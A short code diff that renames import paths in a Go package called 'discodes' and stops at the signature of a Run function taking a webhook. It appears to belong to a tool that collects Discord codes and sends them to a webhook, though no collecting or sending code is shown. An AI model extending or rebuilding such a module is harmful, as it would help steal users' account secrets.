@@ -1,12 +1,12 @@
-
 package discodes
 
 import (
-	"github.com/hackirby/skuld/utils/hardware"
-	"github.com/hackirby/skuld/utils/requests"
 	"os"
 	"path/filepath"
 	"strings"
+
+	"github.com/lukyydnv/hakaist/pkg/utils/hardware"
+	"github.com/lukyydnv/hakaist/pkg/utils/requests"
 )
 
 func Run(webhook string) {
